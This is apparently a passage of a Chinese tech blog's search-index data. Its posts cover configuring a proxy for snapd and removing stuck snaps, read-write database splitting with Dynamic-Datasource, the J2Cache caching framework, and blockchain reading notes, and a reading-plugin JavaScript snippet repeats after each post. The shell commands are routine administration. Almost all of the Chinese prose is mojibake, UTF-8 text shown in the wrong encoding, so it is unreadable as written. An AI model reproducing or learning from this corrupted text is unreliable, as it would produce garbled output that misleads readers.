ç¼–è¾‘SnapæœåŠ¡çš„é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼ˆç¯å¢ƒå˜é‡ï¼‰# systemctl edit snapd.service[Service]Environment=http_proxy=127.0.0.1:1080Environment=https_proxy=127.0.0.1:1080# ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ# systemctl daemon-reload# é‡å¯æœåŠ¡# systemctl restart snapd.service# æ–¹æ³•äºŒï¼ˆç¦»çº¿å®‰è£…ï¼‰# æ‰“å¼€æµè§ˆå™¨å‰å¾€ https://uappexplorer.com/snaps æœç´¢å¹¶ä¸‹è½½éœ€è¦çš„snapåŒ…# æ‰§è¡Œæœ¬åœ°å®‰è£…å‘½ä»¤ï¼šsnap install xxx.snap --dangerous è§£å†³ Snap åº”ç”¨ç¨‹åºæ— æ³•å¸è½½çš„é—®é¢˜ 1234567891011# ä¸¾ä¾‹è¯´æ˜ï¼šå‡å¦‚åº”ç”¨ç¨‹åºcoreæ— æ³•å¸è½½ï¼Œå¯å…ˆå–æ¶ˆæŒ‚è½½å¯¹åº”çš„/dev/loopxxè®¾å¤‡ï¼Œç„¶åå†æ‰§è¡Œå¸è½½æ“ä½œ# æŸ¥çœ‹snapè®¾å¤‡çš„æŒ‚è½½æƒ…å†µ# df -h | grep snap/dev/loop1 90M 90M 0 100% /usr/var/lib/snapd/snap/core/7713# å–æ¶ˆè®¾å¤‡æŒ‚è½½# umount /dev/loop1# å¸è½½åº”ç”¨# snap remove core Snapcraft æ‰“åŒ…æ„å»º Snap åº”ç”¨ç¨‹åº Snapcraft å¯ä»¥ç”¨æ¥æ„å»º Snap çš„åº”ç”¨ç¨‹åºï¼Œä½¿ç”¨ä¹Ÿéå¸¸çš„ç®€å•ï¼Œä»…ä»…éœ€è¦å†™ä¸€ä¸ª snapcraft.yaml çš„é…ç½®æ–‡ä»¶å³å¯ï¼Œä½œç”¨ç±»ä¼¼ Docker çš„ docker-fileï¼Œå…·ä½“çš„æ‰“åŒ…æ•™ç¨‹å¯å‚è€ƒè¿™é‡Œã€‚ å‚è€ƒåšå®¢ Linux å®‰è£…æ¨¡å¼ AppImage,Flatpak,Snap æ•´ç† Ubuntu 18.04 åŠ Snap ä½“éªŒ â€” è®© Linux å…¥é—¨æ›´ç®€å• çœŸæœ‰ç”¨ï¼ŸSnap å’Œ Flatpak é€šåƒæ‰€æœ‰å‘è¡Œç‰ˆçš„æ‰“åŒ…æ–¹å¼ ä¸‰æ¬¾æ–°æ˜Ÿ Linux è§£å†³æ–¹æ¡ˆï¼šSnappyã€Flatpak å’Œ AppImage var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"æ•°æ®åº“è¯»å†™åˆ†ç¦»ï¼ˆåŠ¨æ€æ•°æ®æºåˆ‡æ¢ï¼‰ä»‹ç»",url:"/posts/a6aa7529.html",text:'æ•°æ®åº“è¯»å†™åˆ†ç¦»æ–¹æ¡ˆä»‹ç»è¯»å†™åˆ†ç¦»è¦åšçš„äº‹æƒ…å°±æ˜¯å†³å®šä¸€æ¡ SQL è¯¥åˆ°å“ªä¸ªæ•°æ®åº“å»æ‰§è¡Œï¼Œè‡³äºè°æ¥åšå†³å®šæ•°æ®åº“è¿™ä»¶äº‹ï¼Œè¦ä¹ˆæ•°æ®åº“ä¸­é—´ä»¶å»åšï¼Œè¦ä¹ˆåº”ç”¨ç¨‹åºè‡ªå·±å»åšã€‚é¦–å…ˆé’ˆå¯¹åº”ç”¨ç¨‹åºè‡ªå·±å»åšçš„åœºæ™¯ï¼Œè¯»å†™åˆ†ç¦»çš„èŒè´£åº”è¯¥å±äºæ•°æ®è®¿é—®å±‚è€Œä¸æ˜¯ä¸šåŠ¡å±‚ï¼Œå…¶æ¬¡è¯»å†™åˆ†ç¦»ä¸åº”è¯¥å…¥ä¾µåˆ°ä»£ç ä¸­ã€‚å› æ­¤åœ¨ Serviceâ€”DAOâ€”ORMâ€” æ•°æ®åº“é©±åŠ¨çš„è°ƒç”¨é“¾ä¸­ï¼Œè¦æƒ³åšåˆ°ä»£ç å¼±å…¥ä¾µæ€§æˆ–è€…é›¶å…¥ä¾µæ€§ï¼Œåªèƒ½å°†è¯»å†™åˆ†ç¦»å†™åœ¨ ORM å±‚æˆ–è€…æ•°æ®åº“é©±åŠ¨å±‚ï¼Œå†™åœ¨ ORM å±‚å°±å’Œå…·ä½“ ORM æ¡†æ¶è€¦åˆï¼Œå†™åœ¨æ•°æ®åº“é©±åŠ¨å±‚ï¼Œå°±å’Œå…·ä½“æ•°æ®åº“è€¦åˆã€‚è‡³äºåœ¨ ORM å±‚è¿˜æ˜¯åœ¨æ•°æ®åº“é©±åŠ¨å±‚å®ç°è¯»å†™åˆ†ç¦»ï¼Œä¸»è¦çœ‹æ›´æ¢ ORM æ¡†æ¶å’Œæ•°æ®åº“å“ªä¸ªæˆæœ¬æ›´é«˜å’Œå®ç°çš„éš¾æ˜“ç¨‹åº¦ã€‚ä¸€èˆ¬æ¥è®²ï¼Œè¯»å†™åˆ†ç¦»ï¼ˆåŠ¨æ€æ•°æ®æºåˆ‡æ¢ï¼‰çš„æ ¸å¿ƒæ–¹æ¡ˆä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š ç¬¬ä¸€ç§æ„å»ºå¤šå¥—ç¯å¢ƒï¼Œä¼˜åŠ¿æ˜¯æ–¹ä¾¿æ§åˆ¶ä¹Ÿå®¹æ˜“é›†æˆä¸€äº›ç®€å•çš„åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œç¼ºç‚¹æ˜¯éåŠ¨æ€åŒæ—¶ä»£ç é‡è¾ƒå¤šï¼Œé…ç½®éš¾åº¦å¤§ï¼› ç¬¬äºŒç§æ˜¯ä¾é æ•°æ®åº“ä¸­é—´ä»¶ï¼ˆä¾‹å¦‚ï¼šMyCatï¼‰ï¼Œç”±ä¸­é—´ä»¶åšè¯»å†™åˆ†ç¦»ï¼Œä¼˜åŠ¿æ˜¯å¯¹æ•´ä¸ªåº”ç”¨ç¨‹åºéƒ½æ˜¯é€æ˜çš„ï¼Œç¼ºç‚¹æ˜¯é™ä½æ€§èƒ½ï¼Œä¸æ”¯æŒå¤šæ•°æ®æºäº‹åŠ¡ï¼› ç¬¬ä¸‰ç§æ˜¯åº”ç”¨ç¨‹åºè‡ªå·±å»åšï¼Œä¾‹å¦‚ä½¿ç”¨æ”¯æŒè¯»å†™åˆ†ç¦»çš„æ•°æ®åº“é©±åŠ¨ã€ä½¿ç”¨ Spring åŸç”Ÿæä¾›çš„ AbstractRoutingDataSourceã€‚åè€…éœ€è¦æ§åˆ¶åªè¯»äº‹åŠ¡å’Œè¯»å†™äº‹åŠ¡åˆ‡æ¢åˆ°ä¸»åº“ï¼Œå†™æ“ä½œåˆ‡æ¢åˆ°ä¸»åº“ï¼Œè¯»æ“ä½œåˆ‡æ¢åˆ°ä»åº“ï¼›åŒæ—¶ä¿è¯å•ä¸ªäº‹åŠ¡é‡Œé¢æ‰€æœ‰çš„ SQL éƒ½æ˜¯åœ¨åŒä¸€ä¸ªæ•°æ®æºé‡Œæ‰§è¡Œã€‚ç¼ºç‚¹æ˜¯å¤šæ•°æ®æºçš„é…ç½®ä¸çµæ´»ï¼Œä¸æ”¯æŒå¤šæ•°æ®æºäº‹åŠ¡ã€‚å…·ä½“å®ç°æ–¹å¼å¯å‚è€ƒ åŸºäº Service å±‚çš„ Spring è·¯ç”±æ•°æ®æº + AOP / Annotationã€åŸºäº ORM å±‚çš„ Spring è·¯ç”±æ•°æ®æº + Mybatis æ’ä»¶ / Annotationã€‚ æœ€ä½³å®è·µDynamic-DatasourceDynamic-Datasource æ˜¯ MyBatis-Plus å®˜æ–¹çš„è¯»å†™åˆ†ç¦»æ¡†æ¶ã€‚å¦‚æœæ•°æ®æºè¾ƒå°‘ï¼Œåœºæ™¯ä¸å¤æ‚ï¼Œä¸éœ€è¦ä½¿ç”¨å¤šæ•°æ®æºäº‹åŠ¡ï¼Œå¯ä»¥é€‰æ‹©ä¸Šè¿°ä»»æ„ä¸€ç§è¯»å†™åˆ†ç¦»æ–¹æ¡ˆã€‚å¦‚æœéœ€è¦æ›´å¤šç‰¹æ€§ï¼Œåˆä¸æƒ³å¼•å…¥æ•°æ®åº“ä¸­é—´ä»¶ï¼Œå¯å°è¯• Dynamic-Datasourceï¼Œå…·ä½“çš„ä½¿ç”¨æ–¹å¼å»ºè®®é˜…è¯» å®˜æ–¹æ–‡æ¡£ä¸€ã€å®˜æ–¹æ–‡æ¡£äºŒã€å¼€æºä¸­å›½ä»‹ç»ã€‚ ä¼˜åŠ¿ï¼š é¡¹ç›®å¯åŠ¨åæ”¯æŒåŠ¨æ€å¢å‡æ•°æ®æº ç®€åŒ– Druid å’Œ HikariCp é…ç½®ï¼Œæä¾›å…¨å±€å‚æ•°é…ç½® æä¾›è‡ªå®šä¹‰æ•°æ®æºæ¥æºï¼ˆé»˜è®¤ä½¿ç”¨ yml æˆ– properties é…ç½®ï¼‰ æ•°æ®æºåˆ†ç»„ï¼Œé€‚ç”¨äºå¤šç§åœºæ™¯ï¼ŒåŒ…æ‹¬çº¯ç²¹å¤šåº“ã€è¯»å†™åˆ†ç¦»ã€ä¸€ä¸»å¤šä»ã€å¤šä¸»å¤šä»ã€æ··åˆæ¨¡å¼ ä½¿ç”¨ Spel åŠ¨æ€å‚æ•°è§£ææ•°æ®æºï¼Œå¦‚ä» sessionï¼Œheader å’Œå‚æ•°ä¸­è·å–æ•°æ®æºã€‚ï¼ˆå¤šç§Ÿæˆ·æ¶æ„ç¥å™¨ï¼‰ ç®€å•é›†æˆ Druid æ•°æ®æºç›‘æ§å¤šæ•°æ®æºï¼Œç®€å•é›†æˆ Mybatis-Plus ç®€åŒ–å•è¡¨ï¼Œç®€å•é›†æˆ P6sy æ ¼å¼åŒ– SQLï¼Œç®€å•é›†æˆ Jndi æ•°æ®æº ä½¿ç”¨æ­£åˆ™åŒ¹é…æˆ– Spel è¡¨è¾¾å¼æ¥åˆ‡æ¢æ•°æ®æºï¼ˆå®éªŒæ€§åŠŸèƒ½ï¼‰ é»˜è®¤æ”¯æŒé€šè¿‡ @DS æ³¨è§£æ¥åŠ¨æ€é€‰æ‹©æ•°æ®æºï¼ˆä»£ç å…¥ä¾µæ€§å¼ºï¼‰ï¼Œé¢å¤–æ”¯æŒä½¿ç”¨ MyBatis æ’ä»¶åœ¨ ORM å±‚å®ç°çº¯è¯»å†™åˆ†ç¦»ï¼ˆä»£ç é›¶å…¥ä¾µæ€§ï¼‰ï¼Œä½†ä¸¤è€…ä¸èƒ½åŒæ—¶ä½¿ç”¨ ä½¿ç”¨ @DS æ³¨è§£çš„æ—¶å€™ï¼Œæ”¯æŒå¤šå±‚æ•°æ®æºåµŒå¥—åˆ‡æ¢ã€‚ï¼ˆä¸€ä¸ªä¸šåŠ¡ ServiceA è°ƒç”¨ ServiceBï¼ŒServiceB è°ƒç”¨ ServiceCï¼Œæ¯ä¸ª Service éƒ½æ˜¯ä¸åŒçš„æ•°æ®æºï¼‰ åŠ£åŠ¿ ä¸æ”¯æŒå¤šæ•°æ®æºäº‹åŠ¡ï¼ˆåŒä¸€ä¸ªæ•°æ®æºä¸‹æ”¯æŒäº‹åŠ¡ï¼‰ï¼Œç½‘ä¸Šç»å¤§å¤šæ•°æ™®é€šæ–¹æ¡ˆï¼ˆåŸºäº Spring è·¯ç”±æ•°æ®æº ï¼‰ä¹Ÿéƒ½ä¸èƒ½æ”¯æŒ å¦‚æœéœ€è¦ä½¿ç”¨åˆ°åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œé‚£ä¹ˆæ¶æ„åº”è¯¥åˆ°äº†å¾®æœåŠ¡åŒ–çš„æ—¶å€™ æç¤ºï¼šå¦‚æœé¡¹ç›®ä¸­åªæœ‰å‡ ä¸ªæ•°æ®åº“ï¼Œä½†æ˜¯æœ‰å¼ºçƒˆä½¿ç”¨åˆ†å¸ƒå¼äº‹åŠ¡çš„éœ€æ±‚ï¼Œå»ºè®®è¿˜æ˜¯ä½¿ç”¨ä¼ ç»Ÿæ–¹å¼è‡ªå·±æ„å»ºå¤šå¥—ç¯å¢ƒé›†æˆ Atomic è¿™ç±»æ–¹æ¡ˆ çº¦å®š åªåšåˆ‡æ¢æ•°æ®æºè¿™ä»¶æ ¸å¿ƒçš„äº‹æƒ…ï¼Œå¹¶ä¸é™åˆ¶å…·ä½“æ“ä½œï¼Œåˆ‡æ¢äº†æ•°æ®æºå¯ä»¥åšä»»ä½• CRUD æ“ä½œ é…ç½®æ–‡ä»¶ä¸­æ‰€æœ‰ä»¥ä¸‹åˆ’çº¿ _ åˆ†å‰²çš„æ•°æ®æºï¼Œé¦–éƒ¨å³ä¸ºç»„çš„åç§°ï¼Œç›¸åŒç»„åç§°çš„æ•°æ®æºä¼šæ”¾åœ¨ä¸€ä¸ªç»„ä¸‹ åˆ‡æ¢æ•°æ®æºå³å¯ä»¥æ˜¯ç»„åï¼Œä¹Ÿå¯ä»¥æ˜¯å…·ä½“æ•°æ®æºåç§°ï¼Œåˆ‡æ¢æ—¶é»˜è®¤é‡‡ç”¨è´Ÿè½½å‡è¡¡æœºåˆ¶åˆ‡æ¢ é»˜è®¤çš„æ•°æ®æºåç§°ä¸º masterï¼Œå¯ä»¥é€šè¿‡ spring.datasource.dynamic.primary ä¿®æ”¹ æ–¹æ³•ä¸Šçš„æ³¨è§£ä¼˜å…ˆäºç±»ä¸Šæ³¨è§£ Sharding-JdbcSharding-Jdbc æ˜¯ Apache çš„åˆ†å¸ƒå¼æ•°æ®åº“ä¸­é—´ä»¶ã€‚ å‚è€ƒæ–‡çŒ® åŸºäº MyBatis çš„è¯»å†™åˆ†ç¦»æ’ä»¶ è¯»å†™åˆ†ç¦» Spring + Mybatis è§£å†³æ–¹æ¡ˆ å…¶ä»–å¼€æºé¡¹ç›® spring-boot-mybatis-rw spring-boot-mybatis-rw docs var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"J2Cache - ä¸¤çº§ç¼“å­˜æ¡†æ¶ä»‹ç»",url:"/posts/c8f728b3.html",text:'ç›¸å…³ç«™ç‚¹ J2Cache Gitee J2Cache Java Docs J2Cache å®˜æ–¹è§†é¢‘ä»‹ç» J2Cache å®˜æ–¹ PDF ä»‹ç» J2Cache çš„ç®€å•æµ‹è¯• ä¸»æµç¼“å­˜æ¡†æ¶ Ehcacheã€Caffeine ã€Spring Cacheã€Guava Cacheã€JetCache ä¸»æµç¼“å­˜è§£å†³æ–¹æ¡ˆ å†…å­˜ç¼“å­˜ï¼ˆå¦‚ Ehcacheã€Caffeineï¼‰ â€” é€Ÿåº¦å¿«ï¼Œè¿›ç¨‹å†…å¯ç”¨ é›†ä¸­å¼ç¼“å­˜ï¼ˆå¦‚ Redisã€Memcachedï¼‰â€” å¯åŒæ—¶ä¸ºå¤šèŠ‚ç‚¹æä¾›æœåŠ¡ å¸¸è§çš„ç¼“å­˜æ¸…é™¤ç­–ç•¥ Ehcache è‡ªåŠ¨æ¸…é™¤ ç¨‹åºæ¸…é™¤ æ‰‹å·¥æ¸…é™¤ Ehcache çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š è¯»å†™å†…å­˜ï¼Œé€Ÿåº¦å¿« ä¸¤çº§ç¼“å­˜ï¼ˆå†…å­˜ + ç£ç›˜ï¼‰ å¤šåŒºåŸŸ (Region) çš„ç¼“å­˜æ•°æ®ç»“æ„ æš´éœ²äº†ç¼“å­˜æ•°æ®ç›‘å¬æ¥å£ æ”¯æŒå¤šç§é›†ç¾¤éƒ¨ç½²æ–¹å¼ (JGroupsã€RMIã€Ehcache Server) ç¼ºç‚¹ï¼š é«˜å³°æœŸé‡å¯å¯¼è‡´çš„ç¼“å­˜é›ªå´© å•èŠ‚ç‚¹å¯¹çªå‘çš„æ”»å‡»åº”ä»˜ä¸è¶³ å¤šèŠ‚ç‚¹è¿è¡Œæ—¶ç¼“å­˜æ•°æ®ä¸åŒæ­¥ J2Cache çœŸæ­£è§£å†³çš„é—®é¢˜ ä½¿ç”¨å†…å­˜ç¼“å­˜æ—¶ï¼Œä¸€æ—¦åº”ç”¨é‡å¯åï¼Œç”±äºç¼“å­˜æ•°æ®ä¸¢å¤±ï¼Œç¼“å­˜é›ªå´©ï¼Œç»™æ•°æ®åº“é€ æˆå·¨å¤§å‹åŠ›ï¼Œå¯¼è‡´åº”ç”¨å µå¡ ä½¿ç”¨å†…å­˜ç¼“å­˜æ—¶ï¼Œå¤šä¸ªåº”ç”¨èŠ‚ç‚¹æ— æ³•å…±äº«ç¼“å­˜æ•°æ® ä½¿ç”¨é›†ä¸­å¼ç¼“å­˜ï¼Œç”±äºå¤§é‡çš„æ•°æ®é€šè¿‡ç¼“å­˜è·å–ï¼Œå¯¼è‡´ç¼“å­˜æœåŠ¡çš„æ•°æ®ååé‡å¤ªå¤§ï¼Œå¸¦å®½è·‘æ»¡ã€‚ç°è±¡å°±æ˜¯ Redis æœåŠ¡è´Ÿè½½ä¸é«˜ï¼Œä½†æ˜¯ç”±äºæœºå™¨ç½‘å¡å¸¦å®½è·‘æ»¡ï¼Œå¯¼è‡´æ•°æ®è¯»å–éå¸¸æ…¢ æç¤ºï¼šJ2Cache ä¸é€‚åˆå¯¹æ•°æ®ä¸€è‡´æ€§è¦æ±‚å¾ˆé«˜çš„ä¸šåŠ¡åœºæ™¯ã€‚ J2Cache çš„è®¾è®¡æ€è·¯ åœ¨ J2Cache çš„æœ€æ–°ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤æ”¯æŒä½¿ç”¨ Jgroupsã€Redisã€RabbitMQã€RocketMQ æ¥åŒæ­¥ä¸åŒæœºå™¨èŠ‚ç‚¹çš„ä¸€çº§ç¼“å­˜æ•°æ®ã€‚ J2Cache æ•°æ®è¯»å–æµç¨‹ J2Cache æ•°æ®æ›´æ–°æµç¨‹ J2Cache å¯¹ç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ”¯æŒ æ”¯æŒä½¿ç”¨ Ehcacheã€Ehcache3ã€Caffeine ä½œä¸ºä¸€çº§ç¼“å­˜ æ”¯æŒä½¿ç”¨ Redisã€Memcached ä½œä¸ºäºŒçº§ç¼“å­˜ æ”¯æŒä½¿ç”¨ Fstã€Kyroã€Fastjsonã€Java åŸç”Ÿçš„åºåˆ—åŒ–æœºåˆ¶ æ”¯æŒä½¿ç”¨ Jgroupsã€Redisã€RabbitMQã€RocketMQ æ¥åŒæ­¥ä¸åŒæœºå™¨èŠ‚ç‚¹çš„ä¸€çº§ç¼“å­˜æ•°æ® æ”¯æŒä½¿ç”¨ Jedisã€Lettuce ä½œä¸º Redis çš„å®¢æˆ·ç«¯ æ”¯æŒä½œä¸º Hibernate3ã€Hibernate4ã€Hibernate5ã€MyBatis çš„äºŒçº§ç¼“å­˜å®ç° ä¸‹ç¯‡ï¼šMyBatis ä½¿ç”¨ J2Cache ä½œä¸ºäºŒçº§ç¼“å­˜å®ç° var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java ç¼“å­˜"},{title:"ã€ŠåŒºå—é“¾åŸç†ã€è®¾è®¡ä¸åº”ç”¨ã€‹è¯»ä¹¦ç¬”è®°ä¸€",url:"/posts/a548291f.html",text:'åŒºå—é“¾æ ¸å¿ƒæŠ€æœ¯å»ä¸­å¿ƒåŒ–çš„æŠ€æœ¯éš¾å…³ç°å®ç”Ÿæ´»ä¸­å¸¸ç”¨çš„çº¸å¸å…·å¤‡è‰¯å¥½çš„å¯è½¬ç§»æ€§ï¼Œå¯ä»¥ç›¸å¯¹å®¹æ˜“åœ°å®Œæˆä»·å€¼çš„äº¤å‰²ã€‚ä½†æ˜¯å¯¹äºæ•°å­—è´§å¸æ¥è¯´ï¼Œæ•°å­—åŒ–å†…å®¹å®¹æ˜“è¢«å¤åˆ¶ï¼Œæ•°å­—è´§å¸æŒæœ‰äººå¯ä»¥å°†åŒä¸€ä»½è´§å¸å‘ç»™å¤šä¸ªæ¥æ”¶è€…ï¼Œè¿™ç§æ”»å‡»ç§°ä¸º â€œåŒé‡æ”¯ä»˜æ”»å‡»â€ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå°±åªæœ‰å®ç°å»ä¸­å¿ƒåŒ– ( de-centralized ) æˆ–å¤šä¸­å¿ƒåŒ– ( multi-centralized ) çš„æ•°å­—è´§å¸ç³»ç»Ÿã€‚è¦å®ç°ä¸€å¥—å»ä¸­å¿ƒåŒ–çš„æ•°å­—è´§å¸æœºåˆ¶ï¼Œæœ€å…³é”®çš„æ˜¯è¦å»ºç«‹ä¸€å¥—å¯é çš„äº¤æ˜“è®°å½•ç³»ç»Ÿï¼Œä»¥åŠå½¢æˆä¸€å¥—åˆç†çš„è´§å¸å‘è¡Œæœºåˆ¶ã€‚åœ¨ â€œå»ä¸­å¿ƒåŒ–â€ çš„åœºæ™¯ä¸‹ï¼Œå®ç°æ•°å­—è´§å¸å­˜åœ¨å¦‚ä¸‹å‡ ä¸ªéš¾é¢˜ï¼š è´§å¸çš„é˜²ä¼ªï¼šè°æ¥è´Ÿè´£å¯¹è´§å¸çš„çœŸä¼ªè¿›è¡Œé‰´å®šï¼› è´§å¸çš„äº¤æ˜“ï¼šå¦‚ä½•ç¡®ä¿è´§å¸ä»ä¸€æ–¹å®‰å…¨è½¬ç§»åˆ°å¦å¤–ä¸€æ–¹ï¼› é¿å…åŒé‡æ”¯ä»˜ï¼šå¦‚ä½•é¿å…åŒä¸€ä»½è´§å¸æ”¯ä»˜ç»™å¤šä¸ªæ¥æ”¶è€…ã€‚ åŒºå—é“¾åŸºæœ¬åŸç†é¦–å…ˆï¼ŒåŒºå—é“¾åŒ…æ‹¬ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µï¼š äº¤æ˜“ (transaction)ï¼šä¸€æ¬¡å¯¹è´¦æœ¬çš„æ“ä½œï¼Œå¯¼è‡´è´¦æœ¬çŠ¶æ€çš„ä¸€æ¬¡æ”¹å˜ï¼Œå¦‚æ·»åŠ ä¸€æ¡è½¬è´¦è®°å½•ï¼› åŒºå— (block)ï¼šè®°å½•ä¸€æ®µæ—¶é—´å†…å‘ç”Ÿçš„æ‰€æœ‰äº¤æ˜“å’ŒçŠ¶æ€ç»“æœï¼Œæ˜¯å¯¹å½“å‰è´¦æœ¬çŠ¶æ€çš„ä¸€æ¬¡å…±è¯†ï¼› é“¾ (chain)ï¼šç”±åŒºå—æŒ‰ç…§å‘ç”Ÿé¡ºåºä¸²è”è€Œæˆï¼Œæ˜¯æ•´ä¸ªè´¦æœ¬çŠ¶æ€å˜åŒ–çš„æ—¥å¿—è®°å½•ã€‚ å¦‚æœæŠŠåŒºå—é“¾ä½œä¸ºä¸€ä¸ªçŠ¶æ€æœºï¼Œåˆ™æ¯æ¬¡äº¤æ˜“å°±æ˜¯è¯•å›¾æ”¹å˜ä¸€æ¬¡çŠ¶æ€ï¼Œè€Œæ¯æ¬¡å…±è¯†ç”Ÿæˆçš„åŒºå—ï¼Œå°±æ˜¯å‚ä¸è€…å¯¹äºåŒºå—ä¸­äº¤æ˜“å¯¼è‡´çŠ¶æ€æ”¹å˜çš„ç»“æœè¿›è¡Œç¡®è®¤ã€‚åœ¨å®ç°ä¸Šï¼Œé¦–å…ˆå‡è®¾å­˜åœ¨ä¸€ä¸ªåˆ†å¸ƒå¼çš„æ•°æ®è®°å½•è´¦æœ¬ï¼Œè¿™ä¸ªè´¦æœ¬åªå…è®¸æ·»åŠ ã€ä¸å…è®¸åˆ é™¤ã€‚è´¦æœ¬åº•å±‚çš„åŸºæœ¬ç»“æ„æ˜¯ä¸€ä¸ªçº¿æ€§çš„é“¾è¡¨ï¼Œè¿™ä¹Ÿæ˜¯å…¶åå­— â€œåŒºå—é“¾â€ çš„æ¥æºã€‚é“¾è¡¨ç”±ä¸€ä¸ªä¸ª â€œåŒºå—â€ ä¸²è”ç»„æˆ (å¦‚ä¸‹å›¾æ‰€ç¤º)ï¼Œåç»§åŒºå—è®°å½•å‰å¯¼åŒºå—çš„å“ˆå¸Œå€¼ ( pre hash )ã€‚æ–°çš„æ•°æ®è¦åŠ å…¥ï¼Œå¿…é¡»æ”¾åˆ°ä¸€ä¸ªæ–°çš„åŒºå—ä¸­ã€‚è€Œè¿™ä¸ªå— (ä»¥åŠå—é‡Œçš„äº¤æ˜“) æ˜¯å¦åˆæ³•ï¼Œå¯ä»¥é€šè¿‡è®¡ç®—å“ˆå¸Œå€¼çš„æ–¹å¼å¿«é€Ÿæ£€éªŒå‡ºæ¥ã€‚ä»»æ„ç»´æŠ¤èŠ‚ç‚¹éƒ½å¯ä»¥æè®®ä¸€ä¸ªæ–°çš„åˆæ³•åŒºå—ï¼Œç„¶è€Œå¿…é¡»ç»è¿‡ä¸€å®šçš„å…±è¯†æœºåˆ¶æ¥å¯¹æœ€ç»ˆé€‰æ‹©çš„åŒºå—è¾¾æˆä¸€è‡´ã€‚ ä»¥æ¯”ç‰¹å¸ä¸ºä¾‹ç†è§£åŒºå—é“¾å·¥ä½œè¿‡ç¨‹ä»¥æ¯”ç‰¹å¸ç½‘ç»œä¸ºä¾‹ï¼Œå¯ä»¥å…·ä½“çœ‹å…¶ä¸­å¦‚ä½•ä½¿ç”¨äº†åŒºå—é“¾æŠ€æœ¯ã€‚é¦–å…ˆï¼Œæ¯”ç‰¹å¸å®¢æˆ·ç«¯å‘èµ·ä¸€é¡¹äº¤æ˜“ï¼Œå¹¿æ’­åˆ°æ¯”ç‰¹å¸ç½‘ç»œä¸­å¹¶ç­‰å¾…ç¡®è®¤ã€‚ç½‘ç»œä¸­çš„èŠ‚ç‚¹ä¼šå°†ä¸€äº›æ”¶åˆ°çš„ç­‰å¾…ç¡®è®¤çš„äº¤æ˜“è®°å½•æ‰“åŒ…åœ¨ä¸€èµ· (æ­¤å¤–è¿˜è¦åŒ…æ‹¬å‰ä¸€ä¸ªåŒºå—å¤´éƒ¨çš„å“ˆå¸Œå€¼ç­‰ä¿¡æ¯)ï¼Œç»„æˆä¸€ä¸ªå€™é€‰åŒºå—ã€‚ç„¶åï¼Œè¯•å›¾æ‰¾åˆ°ä¸€ä¸ª nonce ä¸² (éšæœºä¸²) æ”¾åˆ°åŒºå—é‡Œï¼Œä½¿å¾—å€™é€‰åŒºå—çš„å“ˆå¸Œç»“æœæ»¡è¶³ä¸€å®šæ¡ä»¶ (æ¯”å¦‚å°äºæŸä¸ªå€¼)ã€‚è¿™ä¸ª nonce ä¸²çš„æŸ¥æ‰¾éœ€è¦ä¸€å®šçš„æ—¶é—´å»è¿›è¡Œè®¡ç®—å°è¯•ã€‚ä¸€æ—¦èŠ‚ç‚¹ç®—å‡ºæ¥æ»¡è¶³æ¡ä»¶çš„ nonce ä¸²ï¼Œè¿™ä¸ªåŒºå—åœ¨æ ¼å¼ä¸Šå°±è¢«è®¤ä¸ºæ˜¯ â€œåˆæ³•â€ äº†ï¼Œå°±å¯ä»¥å°è¯•åœ¨ç½‘ç»œä¸­å°†å®ƒå¹¿æ’­å‡ºå»ã€‚å…¶ä»–èŠ‚ç‚¹æ”¶åˆ°å€™é€‰åŒºå—ï¼Œè¿›è¡ŒéªŒè¯ï¼Œå‘ç°ç¡®å®ç¬¦åˆçº¦å®šæ¡ä»¶äº†ï¼Œå°±æ‰¿è®¤è¿™ä¸ªåŒºå—æ˜¯ä¸€ä¸ªåˆæ³•çš„æ–°åŒºå—ï¼Œå¹¶æ·»åŠ åˆ°è‡ªå·±ç»´æŠ¤çš„åŒºå—é“¾ä¸Šã€‚å½“å¤§éƒ¨åˆ†èŠ‚ç‚¹éƒ½å°†åŒºå—æ·»åŠ 